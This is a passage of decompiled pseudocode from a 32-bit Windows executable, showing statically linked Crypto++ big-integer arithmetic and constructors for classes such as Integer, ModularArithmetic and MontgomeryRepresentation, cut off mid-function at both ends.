    v14 = v15 + v13;
    v9 = v8 | __CFADD__(*(_DWORD *)(v5 + 4 * v7 + 4), v14);
  }
  return v8;
}

//----- (0040E335) --------------------------------------------------------
BOOL __fastcall sub_40E335(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v5; // edi
  int v6; // edx
  unsigned int v7; // ecx
  bool v8; // cf
  bool v9; // cf
  unsigned int v10; // esi
  unsigned int v11; // ett
  unsigned int v12; // esi
  unsigned int v13; // ett
  unsigned int v14; // esi
  unsigned int v15; // ett
  unsigned int v16; // esi
  unsigned int v17; // ett

  v4 = a3 + 4 * a1;
  v5 = a4 + 4 * a1;
  v6 = a2 + 4 * a1;
  v7 = -a1;
  v8 = 0;
  if ( (v7 & 2) == 0 )
    goto LABEL_3;
  v9 = v7 < 2;
  for ( v7 -= 2; ; *(_DWORD *)(v6 + 4 * v7 + 4) = v12 - v13 )
  {
    v14 = *(_DWORD *)(v4 + 4 * v7 + 8);
    v15 = v9 + *(_DWORD *)(v5 + 4 * v7 + 8);
    v8 = v14 < v15;
    *(_DWORD *)(v6 + 4 * v7 + 8) = v14 - v15;
    v16 = *(_DWORD *)(v4 + 4 * v7 + 12);
    v17 = v8 + *(_DWORD *)(v5 + 4 * v7 + 12);
    v8 = v16 < v17;
    *(_DWORD *)(v6 + 4 * v7 + 12) = v16 - v17;
    v7 += 4;
LABEL_3:
    if ( !v7 )
      break;
    v10 = *(_DWORD *)(v4 + 4 * v7);
    v11 = v8 + *(_DWORD *)(v5 + 4 * v7);
    v8 = v10 < v11;
    *(_DWORD *)(v6 + 4 * v7) = v10 - v11;
    v12 = *(_DWORD *)(v4 + 4 * v7 + 4);
    v13 = v8 + *(_DWORD *)(v5 + 4 * v7 + 4);
    v9 = v12 < v13;
  }
  return v8;
}

//----- (0040E398) --------------------------------------------------------
unsigned int __cdecl sub_40E398(_DWORD *a1)
{
  unsigned int v2; // esi
  unsigned int v3; // edx

  if ( !*a1 )
    return 0;
  v2 = 0;
  v3 = 32;
  do
  {
    if ( *a1 >> ((v3 + v2) >> 1) )
      v2 = (v3 + v2) >> 1;
    else
      v3 = (v3 + v2) >> 1;
  }
  while ( v3 - v2 > 8 );
  return v3 >> 3;
}

//----- (0040E3CF) --------------------------------------------------------
int *__cdecl sub_40E3CF(int *a1, unsigned int *a2, unsigned int *a3, unsigned int *a4, unsigned int *a5)
{
  int v5; // esi
  int *result; // eax
  int v7; // edx

  if ( *(_QWORD *)a5 )
  {
    *a2 = *a3;
    a2[1] = a3[1];
    a2[2] = *a4;
    a2[3] = a4[1];
    v5 = sub_40E43F(a2 + 1, *a5, a5[1]);
    *a1 = sub_40E43F(a2, *a5, a5[1]);
    result = a1;
    a1[1] = v5;
  }
  else
  {
    v7 = a4[1];
    result = a1;
    *a1 = *a4;
    a1[1] = v7;
  }
  return result;
}

//----- (0040E43F) --------------------------------------------------------
int __cdecl sub_40E43F(unsigned int *a1, unsigned int a2, unsigned int a3)
{
  unsigned int *v3; // ebx
  unsigned __int64 v4; // rax
  unsigned __int64 v5; // rax
  bool v6; // cf
  unsigned int v7; // esi
  int v8; // edi
  unsigned __int64 v9; // rax
  unsigned int v10; // ebp
  unsigned int v11; // ebp
  unsigned int v12; // esi
  int v13; // ecx
  unsigned int v14; // ebp
  unsigned int v15; // ebp
  int result; // eax
  unsigned int v17; // ecx
  unsigned int v18; // ebp
  unsigned __int64 v19; // kr08_8
  int v20; // eax
  unsigned __int64 v21; // [esp-10h] [ebp-20h]
  unsigned __int64 v22; // [esp-8h] [ebp-18h]
  unsigned int v23; // [esp+14h] [ebp+4h]

  if ( !a3 )
  {
    v3 = a1;
    v22 = a2;
    v21 = *(_QWORD *)a1;
    goto LABEL_6;
  }
  if ( a3 != -1 )
  {
    v3 = a1;
    v22 = a3 + 1;
    v21 = *(_QWORD *)(a1 + 1);
LABEL_6:
    v4 = v21 / v22;
    goto LABEL_7;
  }
  v3 = a1;
  LODWORD(v4) = a1[2];
LABEL_7:
  v23 = v4;
  v5 = a2 * (unsigned __int64)(unsigned int)v4;
  v6 = *v3 < (unsigned int)v5;
  *v3 -= v5;
  v7 = HIDWORD(v5);
  v8 = -v6;
  v9 = a3 * (unsigned __int64)v23;
  v10 = v3[1];
  v6 = v10 < v7;
  v11 = v10 - v7;
  v12 = a2;
  v13 = (__PAIR64__(-v6, v11) - (unsigned int)-v8) >> 32;
  v14 = v11 + v8;
  v6 = v14 < (unsigned int)v9;
  v15 = v14 - v9;
  result = v23;
  v3[2] += v13 - (v6 + HIDWORD(v9));
  while ( 1 )
  {
    v17 = v3[2];
    v3[1] = v15;
    if ( !v17 && v15 <= a3 )
      break;
LABEL_13:
    v18 = v3[1];
    v19 = *v3 - (unsigned __int64)v12;
    *v3 = v19;
    v20 = (v18 - (unsigned __int64)a3 - (unsigned int)-HIDWORD(v19)) >> 32;
    v15 = v18 - a3 + HIDWORD(v19);
    v3[2] += v20;
    result = ++v23;
  }
  if ( v15 == a3 && *v3 >= a2 )
  {
    v12 = a2;
    goto LABEL_13;
  }
  return result;
}

//----- (0040E4FF) --------------------------------------------------------
void *__cdecl sub_40E4FF(int a1, void *Source, unsigned int a3, unsigned int a4, char a5)
{
  void *v6; // eax
  unsigned int v7; // edx
  void *v8; // ebx
  rsize_t v9; // edx

  if ( a3 == a4 )
    return Source;
  if ( a5 )
  {
    v6 = (void *)sub_41C6BE(a4, 0);
    v7 = a3;
    v8 = v6;
    if ( a4 < a3 )
      v7 = a4;
    v9 = 4 * v7;
    if ( Source )
    {
      if ( v6 )
        memcpy_s(v6, v9, Source, v9);
    }
    sub_409348(Source, a3);
    return v8;
  }
  else
  {
    sub_409348(Source, a3);
    return (void *)sub_41C6BE(a4, 0);
  }
}

//----- (0040E56F) --------------------------------------------------------
_DWORD *__cdecl sub_40E56F(_DWORD *a1, int a2, int a3, int a4, int a5, int a6)
{
  _DWORD *result; // eax
  _BYTE *v7; // [esp+24h] [ebp+1Ch]

  v7 = &sub_40E59E(a2, a3, (_BYTE *)(a4 + a6))[-a4];
  result = a1;
  *a1 = a4;
  a1[1] = a5;
  a1[2] = v7;
  return result;
}

//----- (0040E59E) --------------------------------------------------------
_BYTE *__cdecl sub_40E59E(int a1, int a2, _BYTE *a3)
{
  int i; // edx

  for ( i = a2; i != a1; ++a3 )
    *a3 = *(_BYTE *)--i;
  return a3;
}

//----- (0040E5BB) --------------------------------------------------------
void __cdecl sub_40E5BB(_DWORD *a1, int a2, _DWORD *a3)
{
  int i; // ecx

  for ( i = a2; i; --i )
  {
    if ( a1 )
      *a1 = *a3;
    ++a1;
  }
}

//----- (0040E5DE) --------------------------------------------------------
_DWORD *__cdecl sub_40E5DE(_DWORD *a1, int a2, int a3, int a4, int a5, int a6)
{
  sub_40E56F(a1, a2, a3, a4, a5, a6);
  return a1;
}

//----- (0040E618) --------------------------------------------------------
_DWORD *__thiscall sub_40E618(_DWORD *this)
{
  this[1] = &CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  this[2] = this;
  sub_40E940(this + 3);
  return this;
}
// 46CAB8: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';

//----- (0040E637) --------------------------------------------------------
_DWORD *__thiscall sub_40E637(_DWORD *this)
{
  sub_40E618(this);
  *this = &CryptoPP::EuclideanDomainOf<CryptoPP::Integer>::`vftable';
  sub_40E940(this + 9);
  return this;
}
// 46CD2C: using guessed type void *CryptoPP::EuclideanDomainOf<CryptoPP::Integer>::`vftable';

//----- (0040E667) --------------------------------------------------------
_DWORD *__thiscall sub_40E667(_DWORD *this, int a2)
{
  void *v3; // edx

  this[1] = *(_DWORD *)(a2 + 4);
  this[2] = *(_DWORD *)(a2 + 8);
  v3 = (void *)sub_41C6BE(*(_DWORD *)(a2 + 8), 0);
  this[3] = v3;
  if ( *(_DWORD *)(a2 + 12) )
    memcpy_s(v3, 4 * this[2], *(const void *const *)(a2 + 12), 4 * *(_DWORD *)(a2 + 8));
  return this;
}

//----- (0040E6B1) --------------------------------------------------------
_DWORD *__thiscall sub_40E6B1(_DWORD *this, unsigned int a2)
{
  this[1] = 0x3FFFFFFF;
  this[2] = a2;
  this[3] = sub_41C6BE(a2, 0);
  return this;
}

//----- (0040E6D3) --------------------------------------------------------
_DWORD *__thiscall sub_40E6D3(_DWORD *this, unsigned int a2)
{
  this[1] = 0x3FFFFFFF;
  this[2] = a2;
  this[3] = sub_41C6E2(a2, 0);
  return this;
}

//----- (0040E6F5) --------------------------------------------------------
_DWORD *__thiscall sub_40E6F5(_DWORD *this, int a2, unsigned int a3, unsigned int a4)
{
  *this = a2;
  this[1] = a3;
  this[2] = a4;
  if ( a4 > a3 )
    _invalid_parameter_noinfo_noreturn();
  return this;
}

//----- (0040E718) --------------------------------------------------------
int __thiscall sub_40E718(int this, int a2)
{
  *(_DWORD *)this = 0;
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = 0;
  if ( sub_41C5BD((_DWORD *)this, (*(_DWORD *)(a2 + 4) - *(_DWORD *)a2) >> 2) )
    *(_DWORD *)(this + 4) = sub_40AAC1(*(void **)a2, *(_DWORD *)(a2 + 4), *(void **)this);
  return this;
}

//----- (0040E755) --------------------------------------------------------
std::exception *__thiscall sub_40E755(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::Integer::DivideByZero::`vftable';
  return this;
}
// 46CA7C: using guessed type void *CryptoPP::Integer::DivideByZero::`vftable';

//----- (0040E776) --------------------------------------------------------
_DWORD *__thiscall sub_40E776(_DWORD *this)
{
  _DWORD Src[10]; // [esp+14h] [ebp-28h] BYREF

  sub_40AAE3((int)Src, "Integer: division by zero");
  Src[9] = 0;
  sub_406307(this, 6, Src);
  sub_40BAFC(Src, 1, 0);
  *this = &CryptoPP::Integer::DivideByZero::`vftable';
  return this;
}
// 46CA7C: using guessed type void *CryptoPP::Integer::DivideByZero::`vftable';

//----- (0040E7BF) --------------------------------------------------------
_DWORD *__thiscall sub_40E7BF(_DWORD *this, int a2, unsigned int a3)
{
  int v4; // eax
  _DWORD *v5; // ecx

  *this = &CryptoPP::Integer::`vftable';
  v4 = sub_413329(a3);
  sub_40E6B1(this + 1, v4);
  v5 = (_DWORD *)this[4];
  this[5] = 0;
  *v5 = a2;
  if ( this[3] != 1 )
    memset((void *)(this[4] + 4), 0, 4 * (this[3] - 1));
  return this;
}
// 46CA88: using guessed type void *CryptoPP::Integer::`vftable';

//----- (0040E80A) --------------------------------------------------------
void *__thiscall sub_40E80A(void *this, int *a2)
{
  int v3; // eax
  int v4; // eax
  int v6; // [esp-4h] [ebp-10h]

  *(_DWORD *)this = &CryptoPP::Integer::`vftable';
  v3 = sub_4113F2(a2[4], a2[3]);
  v4 = sub_413329(v3);
  sub_40E6B1((_DWORD *)this + 1, v4);
  v6 = *((_DWORD *)this + 3);
  *((_DWORD *)this + 5) = a2[5];
  sub_4113D1(*((void **)this + 4), (void *)a2[4], v6);
  return this;
}
// 46CA88: using guessed type void *CryptoPP::Integer::`vftable';

//----- (0040E85C) --------------------------------------------------------
_DWORD *__thiscall sub_40E85C(_DWORD *this, int a2)
{
  int v3; // ecx

  *this = &CryptoPP::Integer::`vftable';
  sub_40E6B1(this + 1, 2u);
  v3 = a2;
  if ( a2 < 0 )
  {
    this[5] = 1;
    v3 = -a2;
  }
  else
  {
    this[5] = 0;
  }
  *(_DWORD *)this[4] = v3;
  *(_DWORD *)(this[4] + 4) = 0;
  return this;
}
// 46CA88: using guessed type void *CryptoPP::Integer::`vftable';

//----- (0040E8A1) --------------------------------------------------------
void *__thiscall sub_40E8A1(_DWORD *this, void *Src, size_t Size, int a4, int a5)
{
  void *v5; // ebx
  _DWORD v7[2]; // [esp+10h] [ebp-2Ch] BYREF
  size_t v8; // [esp+18h] [ebp-24h]
  void *v9; // [esp+1Ch] [ebp-20h]
  int v10[3]; // [esp+20h] [ebp-1Ch] BYREF
  void *v11; // [esp+2Ch] [ebp-10h]
  int v12; // [esp+38h] [ebp-4h]

  v5 = this;
  v11 = this;
  *this = &CryptoPP::Integer::`vftable';
  sub_40E6B1(this + 1, 0);
  v12 = 0;
  if ( a5 )
  {
    sub_4115B0(v5, Src, Size, a4);
  }
  else
  {
    sub_408A33(v7, Size);
    LOBYTE(v12) = 1;
    sub_40E6F5(v10, (int)v9, v8, 0);
    sub_40E5DE(v10, (int)Src, (int)Src + Size, v10[0], v10[1], v10[2]);
    v5 = v11;
    sub_4115B0(v11, v9, v8, a4);
    sub_4089EF(v7);
  }
  return v5;
}
// 46CA88: using guessed type void *CryptoPP::Integer::`vftable';
// 40E8A1: using guessed type _DWORD var_2C[2];
// 40E8A1: using guessed type int var_1C[3];

//----- (0040E940) --------------------------------------------------------
void __thiscall sub_40E940(_DWORD *this)
{
  int v2; // eax

  *this = &CryptoPP::Integer::`vftable';
  sub_40E6B1(this + 1, 2u);
  v2 = this[4];
  this[5] = 0;
  *(_DWORD *)(v2 + 4) = 0;
  *(_DWORD *)this[4] = 0;
}
// 46CA88: using guessed type void *CryptoPP::Integer::`vftable';

//----- (0040E96D) --------------------------------------------------------
_DWORD *__thiscall sub_40E96D(_DWORD *this, int a2)
{
  this[1] = &CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  this[2] = this;
  *this = &CryptoPP::ModularArithmetic::`vftable';
  sub_40E80A(this + 3, (int *)(a2 + 12));
  sub_40E7BF(this + 9, 0, *(_DWORD *)(a2 + 24));
  sub_40E940(this + 15);
  return this;
}
// 46CAB8: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
// 46CAF0: using guessed type void *CryptoPP::ModularArithmetic::`vftable';

//----- (0040E9C4) --------------------------------------------------------
_DWORD *__thiscall sub_40E9C4(_DWORD *this, int a2)
{
  this[1] = &CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  this[2] = this;
  *this = &CryptoPP::ModularArithmetic::`vftable';
  sub_40E80A(this + 3, (int *)a2);
  sub_40E7BF(this + 9, 0, *(_DWORD *)(a2 + 12));
  sub_40E940(this + 15);
  return this;
}
// 46CAB8: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
// 46CAF0: using guessed type void *CryptoPP::ModularArithmetic::`vftable';

//----- (0040EA18) --------------------------------------------------------
_DWORD *__thiscall sub_40EA18(_DWORD *this, int a2)
{
  sub_40E96D(this, a2);
  *this = &CryptoPP::MontgomeryRepresentation::`vftable';
  sub_40E80A(this + 21, (int *)(a2 + 84));
  sub_40E667(this + 27, a2 + 108);
  return this;
}
// 46CB60: using guessed type void *CryptoPP::MontgomeryRepresentation::`vftable';

//----- (0040EA62) --------------------------------------------------------
int __thiscall sub_40EA62(int this, int a2)
{
  unsigned int v4; // [esp-4h] [ebp-6Ch]
  int pExceptionObject[10]; // [esp+18h] [ebp-50h] BYREF
  _DWORD Src[9]; // [esp+40h] [ebp-28h] BYREF
  int v7; // [esp+64h] [ebp-4h]

  sub_40E9C4((_DWORD *)this, a2);
  v4 = *(_DWORD *)(this + 24);
  v7 = 0;
  *(_DWORD *)this = &CryptoPP::MontgomeryRepresentation::`vftable';
  sub_40E7BF((_DWORD *)(this + 84), 0, v4);
  sub_40E6B1((_DWORD *)(this + 108), 5 * *(_DWORD *)(this + 24));
  LOBYTE(v7) = 2;
  if ( sub_411C2A((_DWORD *)(this + 12), 0) != 1 )
  {
    sub_40AAE3((int)Src, "MontgomeryRepresentation: Montgomery representation requires an odd modulus");
    LOBYTE(v7) = 3;
    sub_406307(pExceptionObject, 1, Src);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_412D8F(*(_DWORD *)(this + 100), *(unsigned int **)(this + 120), *(_DWORD **)(this + 28), *(_DWORD *)(this + 24));
  return this;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 46CB60: using guessed type void *CryptoPP::MontgomeryRepresentation::`vftable';
// 40EA62: using guessed type _DWORD Src[9];

//----- (0040EB0B) --------------------------------------------------------
_DWORD *__thiscall sub_40EB0B(_DWORD *this, int a2)
{
  _DWORD *v3; // ecx

  v3 = this + 1;
  *this = &CryptoPP::OID::`vftable';
  *v3 = 0;
  v3[1] = 0;
  v3[2] = 0;
  sub_41C60B((_DWORD **)v3, 1u, &a2);
  return this;
}
// 46B594: using guessed type void *CryptoPP::OID::`vftable';

//----- (0040EB3C) --------------------------------------------------------
_DWORD *__thiscall sub_40EB3C(_DWORD *this, void *Src, int Size)
{
  _DWORD *v4; // eax
  int *v5; // eax
  int v7[3]; // [esp+10h] [ebp-34h] BYREF
  int v8[4]; // [esp+1Ch] [ebp-28h] BYREF
  void **v9; // [esp+2Ch] [ebp-18h] BYREF
  int v10[4]; // [esp+30h] [ebp-14h] BYREF
  int v11; // [esp+40h] [ebp-4h]

  sub_40CAC3(this, 0);
  this[3] = -1;
  *((_BYTE *)this + 16) = 0;
  *this = &CryptoPP::StringStore::`vftable';
  this[1] = &CryptoPP::StringStore::`vftable';
  v4 = sub_406A82(v7, Src, Size, 0);
  v11 = 0;
  v5 = (int *)sub_4096C6((char *)&v9, (int)"InputBuffer", (int)v4, 1);
  LOBYTE(v11) = 1;
  sub_41EB56(this, v5);
  sub_40967A(v10);
  v9 = &CryptoPP::NameValuePairs::`vftable';
  sub_4089EF(v8);
  return this;
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 46CBD0: using guessed type void *CryptoPP::StringStore::`vftable';
// 46CC88: using guessed type void *CryptoPP::StringStore::`vftable';
// 40EB3C: using guessed type int var_34[3];
// 40EB3C: using guessed type int var_14[4];
// 40EB3C: using guessed type int var_28[4];

//----- (0040EBD5) --------------------------------------------------------
void __thiscall sub_40EBD5(_DWORD *this)
{
  void *v1; // edx

  v1 = (void *)this[3];
  memset(v1, 0, 4 * *(_DWORD *)((char *)this + (this[1] < this[2] ? 0xFFFFFFFC : 0) + 8));
  j_j___free_base(v1);
}

//----- (0040EC29) --------------------------------------------------------
void __thiscall sub_40EC29(_DWORD *this)
{
  *this = &CryptoPP::ModularArithmetic::`vftable';
  sub_40891D((int)(this + 16));
  sub_40891D((int)(this + 10));
  sub_40891D((int)(this + 4));
}
// 46CAF0: using guessed type void *CryptoPP::ModularArithmetic::`vftable';

//----- (0040EC4B) --------------------------------------------------------
void __thiscall sub_40EC4B(_DWORD *this)
{
  *this = &CryptoPP::MontgomeryRepresentation::`vftable';
  sub_40891D((int)(this + 27));
  sub_40891D((int)(this + 22));
  sub_40EC29(this);
}
// 46CB60: using guessed type void *CryptoPP::MontgomeryRepresentation::`vftable';

//----- (0040EC6C) --------------------------------------------------------
int __thiscall sub_40EC6C(int this, int *a2)
{
  unsigned int v3; // edx
  int v4; // eax
  int v5; // eax

  if ( (int *)this != a2 )
  {
    v3 = a2[3];
    if ( *(_DWORD *)(this + 12) != v3 || !*(_DWORD *)(a2[4] + 4 * (v3 >> 1)) )
    {
      v4 = sub_4113F2(a2[4], a2[3]);
      v5 = sub_413329(v4);
      sub_4128B8(this + 4, v5);
    }
    sub_4113D1(*(void **)(this + 16), (void *)a2[4], *(_DWORD *)(this + 12));
    *(_DWORD *)(this + 20) = a2[5];
  }
  return this;
}

//----- (0040ECC6) --------------------------------------------------------
void *__thiscall sub_40ECC6(int *this, void *a2, unsigned int a3)
{
  int *v3; // eax
  int *v4; // eax
  char v6[4]; // [esp+10h] [ebp-28h] BYREF
  char v7[20]; // [esp+14h] [ebp-24h] BYREF
  int v8; // [esp+28h] [ebp-10h]
  int v9; // [esp+34h] [ebp-4h]

  v8 = 0;
  v3 = (int *)sub_40E80A(v6, this);
  v9 = 0;
  v4 = sub_40F028(v3, a3);
  sub_40E80A(a2, v4);
  sub_40891D((int)v7);
  return a2;
}
// 40ECC6: using guessed type char var_28[4];
// 40ECC6: using guessed type char var_24[20];

//----- (0040ED09) --------------------------------------------------------
char __thiscall sub_40ED09(int *this)
{
  char v1; // bl
  _DWORD *v2; // eax

  v1 = 1;
  if ( this[5] == 1 )
    return 0;
  v2 = (_DWORD *)this[4];
  if ( *v2 || sub_4113F2((int)v2, this[3]) )
    return 0;
  return v1;
}

//----- (0040ED2F) --------------------------------------------------------
int *__cdecl sub_40ED2F(int *a1, void *a2, int a3)
{
  sub_41C537(a2, a1, a3);
  return a1;
}

//----- (0040ED4C) --------------------------------------------------------
_DWORD *__thiscall sub_40ED4C(_DWORD *this)
{
  int *v2; // eax
  int *v3; // eax
  unsigned int *v5; // [esp-Ch] [ebp-40h]
  unsigned int v6; // [esp-8h] [ebp-3Ch]
  char v7[4]; // [esp+10h] [ebp-24h] BYREF
  char v8[28]; // [esp+14h] [ebp-20h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  v6 = this[3];
  v5 = (unsigned int *)this[4];
  if ( this[5] == 1 )
  {
    if ( sub_411C95(v5, v6, 1) )
    {
      sub_411181((int)(this + 1), 2 * this[3]);
      *(_DWORD *)(this[4] + 4 * (this[3] >> 1)) = 1;
    }
  }
  else if ( sub_4115F5(v5, v6, 1) )
  {
    v2 = sub_4128E4();
    v3 = (int *)sub_40EDE5(v2, v7);
    v9 = 0;
    sub_40EC6C((int)this, v3);
    sub_40891D((int)v8);
  }
  return this;
}
// 40ED4C: using guessed type char var_24[4];
// 40ED4C: using guessed type char var_20[28];

//----- (0040EDC8) --------------------------------------------------------
_DWORD *__cdecl sub_40EDC8(_DWORD *a1, _DWORD *a2, int a3)
{
  sub_41210D(a2, a1, a3);
  return a1;
}

//----- (0040EDE5) --------------------------------------------------------
void *__thiscall sub_40EDE5(int *this, void *a2)
{
  sub_40E80A(a2, this);
  sub_4128A1((int *)a2);
  return a2;
}

//----- (0040EE07) --------------------------------------------------------
_DWORD *__cdecl sub_40EE07(_DWORD *a1, _DWORD *a2, unsigned int a3)
{
  sub_4128F1(a2, a1, a3);
  return a1;
}

//----- (0040EE24) --------------------------------------------------------
_DWORD *__cdecl sub_40EE24(_DWORD *a1, int a2, int a3)
{
  _DWORD v4[7]; // [esp+14h] [ebp-1Ch] BYREF

  v4[3] = 0;
  sub_40E718((int)v4, a2 + 4);
  v4[6] = 0;
  a2 = a3;
  sub_40BC96(v4, (unsigned int *)&a2);
  *a1 = &CryptoPP::OID::`vftable';
  sub_40E718((int)(a1 + 1), (int)v4);
  sub_40BB4F((int)v4);
  return a1;
}
// 46B594: using guessed type void *CryptoPP::OID::`vftable';

//----- (0040EE85) --------------------------------------------------------
int *__cdecl sub_40EE85(int *a1, int *a2, int *a3)
{
  sub_4119DA(a2, a1, a3);
  return a1;
}

//----- (0040EEA2) --------------------------------------------------------
int *__cdecl sub_40EEA2(int *a1, int *a2, int *a3)
{
  sub_4121D5(a2, a1, a3);
  return a1;
}

//----- (0040EEBF) --------------------------------------------------------
_DWORD *sub_40EEBF()
{
  _DWORD *v0; // ecx
  _DWORD *result; // eax

  v0 = operator new(0x18u);
  result = 0;
  if ( v0 )
    return sub_40E85C(v0, 1);
  return result;
}

//----- (0040EEEE) --------------------------------------------------------
_DWORD *sub_40EEEE()
{
  _DWORD *v0; // ecx
  _DWORD *result; // eax

  v0 = operator new(0x18u);
  result = 0;
  if ( v0 )
    return sub_40E85C(v0, 0);
  return result;
}

//----- (0040EF1C) --------------------------------------------------------
_DWORD *__thiscall sub_40EF1C(_DWORD *this, int a2)
{
  int v4; // [esp-Ch] [ebp-18h]
  int v5; // [esp-8h] [ebp-14h]
  int v6; // [esp-4h] [ebp-10h]

  sub_411181((int)(this + 1), *(_DWORD *)(a2 + 12));
  if ( this[5] == 1 )
  {
    if ( *(_DWORD *)(a2 + 20) == 1 )
    {
      sub_412978(this, (int)this, a2);
      this[5] = 1;
      return this;
    }
    v6 = (int)this;
    v5 = a2;
    v4 = (int)this;
    goto LABEL_6;
  }
  v6 = a2;
  v5 = (int)this;
  v4 = (int)this;
  if ( *(_DWORD *)(a2 + 20) == 1 )
  {
LABEL_6:
    sub_412C28(v4, v5, v6);
    return this;
  }
  sub_412978(this, (int)this, a2);
  return this;
}

//----- (0040EF6C) --------------------------------------------------------
_DWORD *__thiscall sub_40EF6C(_DWORD *this, int a2)
{
  int v4; // [esp-Ch] [ebp-18h]
  int v5; // [esp-8h] [ebp-14h]
  int v6; // [esp-4h] [ebp-10h]

  sub_411181((int)(this + 1), *(_DWORD *)(a2 + 12));
  if ( this[5] == 1 )
  {
    if ( *(_DWORD *)(a2 + 20) != 1 )
    {
      sub_412978(this, (int)this, a2);
      this[5] = 1;
      return this;
    }
    v6 = (int)this;
    v5 = a2;
    v4 = (int)this;
LABEL_7:
    sub_412C28(v4, v5, v6);
    return this;
  }
  v6 = a2;
  v5 = (int)this;
  v4 = (int)this;
  if ( *(_DWORD *)(a2 + 20) != 1 )
    goto LABEL_7;
  sub_412978(this, (int)this, a2);
  return this;
}

//----- (0040EFBC) --------------------------------------------------------
int *__thiscall sub_40EFBC(int *this, unsigned int a2)
{
  unsigned int v3; // edi
  int *v4; // eax

  v3 = sub_4113F2(this[4], this[3]);
  sub_41C21A((_DWORD *)this[4], v3, a2 >> 5);
  if ( v3 > a2 >> 5 )
    sub_41C1C2(this[4], v3 - (a2 >> 5), a2 & 0x1F);
  if ( this[5] == 1 && !sub_4113F2(this[4], this[3]) )
  {
    v4 = sub_41C5B0();
    sub_40EC6C((int)this, v4);
  }
  return this;
}

//----- (0040F028) --------------------------------------------------------
int *__thiscall sub_40F028(int *this, unsigned int a2)
{
  int v3; // edi
  int v4; // eax

  v3 = sub_4113F2(this[4], this[3]);
  v4 = sub_413329(v3 + ((a2 + 31) >> 5));
  sub_411181((int)(this + 1), v4);
  sub_41C187((_DWORD *)this[4], (a2 >> 5) + v3, a2 >> 5);
  sub_41C142(this[4] + 4 * (a2 >> 5), v3 + (((a2 & 0x1F) + 31) >> 5), a2 & 0x1F);
  return this;
}

//----- (0040F092) --------------------------------------------------------
void *__thiscall sub_40F092(void *Block, char a2)
{
  sub_40891D((int)Block + 40);
  sub_40891D((int)Block + 16);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0040F0BC) --------------------------------------------------------
void *__thiscall sub_40F0BC(void *Block, char a2)
{
  sub_40891D((int)Block + 4);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0040F0DE) --------------------------------------------------------
_DWORD *__thiscall sub_40F0DE(_DWORD *Block, char a2)
{
  sub_40EC29(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0040F0FD) --------------------------------------------------------
_DWORD *__thiscall sub_40F0FD(_DWORD *Block, char a2)
{
  sub_40EC4B(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0040F11C) --------------------------------------------------------
_DWORD *__thiscall sub_40F11C(int *this, _DWORD *a2)
{
  sub_40E80A(a2, this);
  a2[5] = 0;
  return a2;
}

//----- (0040F13D) --------------------------------------------------------
_DWORD *__stdcall sub_40F13D(_DWORD *a1, int a2)
{
  return sub_40EF1C(a1, a2);
}

//----- (0040F14D) --------------------------------------------------------
int *__thiscall sub_40F14D(_DWORD *this, int *a2, int a3)
{
  int v4; // ecx
  int v5; // edi

  v4 = this[6];
  if ( a2[3] == v4 && *(_DWORD *)(a3 + 12) == v4 )
  {
    if ( off_48C064(a2[4], *(_DWORD *)(a3 + 16)) || sub_411259(a2[4], this[7], a2[3]) >= 0 )
      off_48C068(a2[3], a2[4], a2[4], this[7]);
  }
  else
  {
    sub_40EF1C(a2, a3);
    v5 = (int)(this + 3);
    if ( sub_41128E(a2, v5) >= 0 )
      sub_40EF6C(a2, v5);
  }
  return a2;
}
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);
// 48C068: using guessed type int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0040F1C7) --------------------------------------------------------
int __thiscall sub_40F1C7(_DWORD **this, int a2, int a3)
{
  int *v3; // eax

  v3 = (int *)(*(int (__thiscall **)(_DWORD *, int, int))(*this[1] + 60))(this[1], a2, a3);
  return sub_40EC6C(a2, v3);
}

//----- (0040F1E4) --------------------------------------------------------
int __thiscall sub_40F1E4(void *this, _DWORD *a2, unsigned int a3)
{
  int *v4; // eax
  int v5; // esi
  int v7; // [esp+10h] [ebp-24h] BYREF
  char v8[28]; // [esp+14h] [ebp-20h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  v4 = sub_40EE07(&v7, a2, a3);
  v9 = 0;
  v5 = sub_40EC6C((int)this + 36, v4);
  sub_40891D((int)v8);
  return v5;
}
// 40F1E4: using guessed type char var_20[28];

//----- (0040F225) --------------------------------------------------------
int *__thiscall sub_40F225(int *this, _DWORD *a2, unsigned int a3)
{
  int v4; // ecx
  int *v6; // eax
  int *v7; // edi
  int v8; // esi
  int v9; // [esp+10h] [ebp-24h] BYREF
  char v10[28]; // [esp+14h] [ebp-20h] BYREF
  int v11; // [esp+30h] [ebp-4h]

  v4 = this[6];
  if ( a2[3] == v4 && *(_DWORD *)(a3 + 12) == v4 )
  {
    if ( off_48C064(a2[4], *(_DWORD *)(a3 + 16)) || sub_411259(this[13], this[7], a2[3]) >= 0 )
      off_48C068(a2[3], this[13], this[13], this[7]);
    return this + 9;
  }
  else
  {
    v6 = sub_40EE07(&v9, a2, a3);
    v11 = 0;
    v7 = this + 15;
    sub_40EC6C((int)(this + 15), v6);
    v11 = -1;
